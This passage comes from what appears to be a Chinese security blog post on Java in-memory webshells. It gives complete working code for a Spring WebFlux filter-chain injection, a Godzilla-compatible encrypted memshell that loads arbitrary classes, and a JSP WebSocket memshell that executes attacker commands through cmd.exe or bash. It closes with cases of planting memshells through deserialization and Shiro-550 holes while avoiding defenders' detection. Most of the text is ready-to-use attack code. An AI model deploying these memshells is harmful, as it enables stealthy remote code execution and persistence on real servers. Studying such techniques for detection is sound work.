注入的过滤器会拦截路径以 /test2 开头的请求，解析 cmd 参数执行系统命令，并将输出以 TEXT_PLAIN 格式返回，实现远程代码执行。
```

从之前的分析我们知道，主要思路就是通过反射找到DefaultWebFilterChain，然后拿到filters，把我们的filter插入到其中的第一位，再用这个filters重新调用公共构造函数`DefaultWebFilterChain`，赋值给之前分析里面我没看到的`this.chain`即可。

思路就是这么个思路，我们来看具体的代码。

先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为NettyWebServer实例。如果发现一个线程是NettyWebServer，那就继续下一步的操作。接下来就是找DefaultWebFilterChain对象：

```
NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
```

这条链子在之前的分析中已经提到过，一步步调用我们写的getFieldValue函数即可。

然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位：

```
Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
newAllFilters.add(0, new MemoryShellFilter());
DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
```

然后通过反射获取FilteringWebHandler的私有字段chain，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链newChain，然后恢复字段的可访问权限：

```
Field f = filteringWebHandler.getClass().getDeclaredField("chain");
f.setAccessible(true);
Field modifersField = Field.class.getDeclaredField("modifiers");
modifersField.setAccessible(true);
modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
f.set(filteringWebHandler, newChain);
modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
```

这里补充一下上面的`modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);`和`modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);`的含义，第一个代码意思就是使用反射机制，通过`modifersField`对象来修改字段的修饰符，`f.getModifiers()`返回字段`f`的当前修饰符，然后通过位运算`& ~Modifier.FINAL`，将当前修饰符的FINAL位清除（置为0），表示移除了FINAL修饰符；第二个则是把字段的修饰符重新设置为包含`FINAL`修饰符的修饰符，这样就可以保持字段的封装性。

### 3.Godzilla内存马

这里补充个Godzilla内存马

```markdown
import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.core.io.buffer.DefaultDataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.util.MultiValueMap;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Mono;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class SpringWebFluxGodzila implements WebFilter {
  String xc = "3c6e0b8a9c15224a"; // key
  String pass = "pass";
  String md5 = md5(pass + xc);
  Class payload;
  public byte[] x(byte[] s, boolean m) {
    try {
      Cipher c = Cipher.getInstance("AES");
      c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
      return c.doFinal(s);
    } catch (Exception e) {
      return null;
    }
  }
  public static String md5(String s) {
    String ret = null;
    try {
      java.security.MessageDigest m;
      m = java.security.MessageDigest.getInstance("MD5");
      m.update(s.getBytes(), 0, s.length());
      ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
    } catch (Exception e) {
    }
    return ret;
  }

  public static String base64Encode(byte[] bs) throws Exception {
    Class base64;
    String value = null;
    try {
      base64 = Class.forName("java.util.Base64");
      Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
      value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
    } catch (Exception e) {
      try {
        base64 = Class.forName("sun.misc.BASE64Encoder");
        Object Encoder = base64.newInstance();
        value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
      } catch (Exception e2) {
      }
    }
    return value;
  }

  public static byte[] base64Decode(String bs) throws Exception {
    Class base64;
    byte[] value = null;
    try {
      base64 = Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
    } catch (Exception e) {
      try {
        base64 = Class.forName("sun.misc.BASE64Decoder");
        Object decoder = base64.newInstance();
        value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
      } catch (Exception e2) {
      }
    }
    return value;
  }
  public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
    Field f;
    if(superClass){
      f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
    }else {
      f = obj.getClass().getDeclaredField(fieldName);
    }
    f.setAccessible(true);
    return f.get(obj);
  }
  public static String doInject() {
    String msg = "Inject MemShell Failed";
    Method getThreads = null;
    try {
      getThreads = Thread.class.getDeclaredMethod("getThreads");
      getThreads.setAccessible(true);
      Object threads = getThreads.invoke(null);
      for (int i = 0; i < Array.getLength(threads); i++) {
        Object thread = Array.get(threads, i);
        if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
          // 获取defaultWebFilterChain
          NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0",false);
          ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler",false);
          Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler",false);
          HttpWebHandlerAdapter httpWebHandlerAdapter= (HttpWebHandlerAdapter)getFieldValue(delayedInitializationHttpHandler,"delegate",false);
          ExceptionHandlingWebHandler exceptionHandlingWebHandler= (ExceptionHandlingWebHandler)getFieldValue(httpWebHandlerAdapter,"delegate",true);
          FilteringWebHandler filteringWebHandler = (FilteringWebHandler)getFieldValue(exceptionHandlingWebHandler,"delegate",true);
          DefaultWebFilterChain defaultWebFilterChain= (DefaultWebFilterChain)getFieldValue(filteringWebHandler,"chain",false);
          // 构造新的Chain进行替换
          Object handler= getFieldValue(defaultWebFilterChain,"handler",false);
          List<WebFilter> newAllFilters= new ArrayList<>(defaultWebFilterChain.getFilters());
          newAllFilters.add(0,new SpringWebFluxGodzila());// 链的遍历顺序即"优先级"，因此添加到首位
          DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
          Field f = filteringWebHandler.getClass().getDeclaredField("chain");
          f.setAccessible(true);
          Field modifersField = Field.class.getDeclaredField("modifiers");
          modifersField.setAccessible(true);
          modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);// 去掉final修饰符以重新set
          f.set(filteringWebHandler,newChain);
          modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
          msg = "Inject MemShell Successful";
        }
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
    return msg;
  }
  @Override
  public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
    return exchange.getResponse().writeWith(getPost(exchange));
  }
  private Mono<DefaultDataBuffer> getPost(ServerWebExchange exchange){
    Mono<MultiValueMap<String, String>> formData = exchange.getFormData();
    Mono<DefaultDataBuffer> bytesdata = formData.flatMap(map -> {
      StringBuilder result = new StringBuilder();
      try {
        byte[] data = base64Decode(map.getFirst(pass));
        data = x(data, false);
        if (payload == null) {
          URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
          Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
          defMethod.setAccessible(true);
          payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
        } else {
          ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
          Object f = payload.newInstance();
          f.equals(arrOut);
          f.equals(data);
          f.equals(exchange.getRequest());
          result.append(md5.substring(0, 16));
          f.toString();
          result.append(base64Encode(x(arrOut.toByteArray(), true)));
          result.append(md5.substring(16));
        }
      }
      catch (Exception e) {

      }
      return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
    });
    return bytesdata;

  }
}


```

需要注意的是需要在handler前的任意一个流程中去触发doInject()方法，这里补充一个类访问/inject2时触发doInject()方法，这里在后续的Netty中间件内存马会解释怎么回事，因为我也是这里复现失败，去复现Netty才找到的思路解决的

```markdown
  @RestController
  public class InjectController2 {
    @GetMapping("/inject2")
    public String inject() {
      return SpringWebFluxGodzila.doInject();
    }
  }
```

![image-20250619191021044](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619191021044.png)

访问/inject2触发内存马，Godzilla成功连接内存马

![image-20250619191626202](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619191626202.png)

![image-20250619191733699](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619191733699.png)

![image-20250619191851004](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619191851004.png)

# 五.其他内存马

## 5.1.Websocket内存马

```markdown
这里复现的[星火实验室](https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95)的Websocket内存马，目前看下来已经支持Tomcat、Spring、Jetty、WebSphere、WebLogic、Resin等中间件和框架，[wsMemShell](https://github.com/veo/wsMemShell/tree/main)

我们从通用性的角度上看，WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。
```

## 5.2.兼容Tomcat_Spring_Jetty系

依旧使用我们在中间件内存马中用到的Servlet环境，这里只要是Tomcat中间件的都可以复现，如果有报错记得更新一下pom.xml有些Tomcat的Websocket模块依赖需要主动导入

```markdown
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>5.3.24</version>
    </dependency>
    <dependency>
      <groupId>org.apache.tomcat.embed</groupId>
      <artifactId>tomcat-embed-websocket</artifactId>
      <version>8.5.16</version>
    </dependency>
```

Websocket内存马

```markdown
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>

<%!
    public static class C extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
%>
<%
    String path = request.getParameter("path");
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(C.class, path).build();
    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    try {
        if (servletContext.getAttribute(path) == null){
            container.addEndpoint(configEndpoint);
            servletContext.setAttribute(path,path);
        }
        out.println("success, connect url path: " + servletContext.getContextPath() + path);
    } catch (Exception e) {
        out.println(e.toString());
    }
%>

```

```markdown
1.启动Web应用，老规矩GETorPOST访问http://localhost:8080/zhandian1/wscmd.jsp?path=/ipjipwen，传参任意路径触发内存马
```

![image-20250620164424989](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620164424989.png)

![image-20250620164651598](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620164651598.png)

再通过WS协议去跟服务端建立连接执行命令，这里的路径是我们传参的路径

![image-20250620164756515](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620164756515.png)

星火的师傅针对Websocket内存马还开发了[Godzilla、代理、绕Nginx、绕CDN]等扩展内存马，我这就不演示了想了解的可以自己复现，有什么问题可以问我咯。

# X.实战案例

```markdown
`■案例一：某友 NC 反序列化漏洞
在攻击过程中，发现了一个某友 NC 系统存在反序列化漏洞，测试发现 URLDNS 可以收到日志，但是无法反弹 shell，推测是目标环境无法出网。
在经过几次测试后，发现可以尝试文件写入类的漏洞，但文件落地后，会被快速查杀，推测是有文件目录监控手段，发现有新文件生成后会有设备告警，被防守人员查杀。
后来经过本地测试和研究，通过反序列化漏洞直接打入内存马，目标系统的设备无告警，防守人员无感知，成功拿下目标，并进行内网渗透。

`■案例二：springboot + shiro 550 不出网
发现目标是自研的应用系统，使用了 springboot 框架，并使用 shiro 进行鉴权，经过测试，系统使用 shiro 版本较低，使用了默认的 AES 加密密钥，于是尝试使用 shiro 550 CB 链进行攻击，但是攻击发现，系统不出网，无法进行反连。
与此同时，程序使用 springboot ，是以 Jar 的形式启动，没有对 JSP 进行解析的目录，无法通过执行命令写入 JSP Webshell 的形式进行 getshell。
为了持久化并进行进一步的攻击，几经测试，后来使用了 Spring Interceptor 型的内存马，获取了 Web 服务器权限。
```

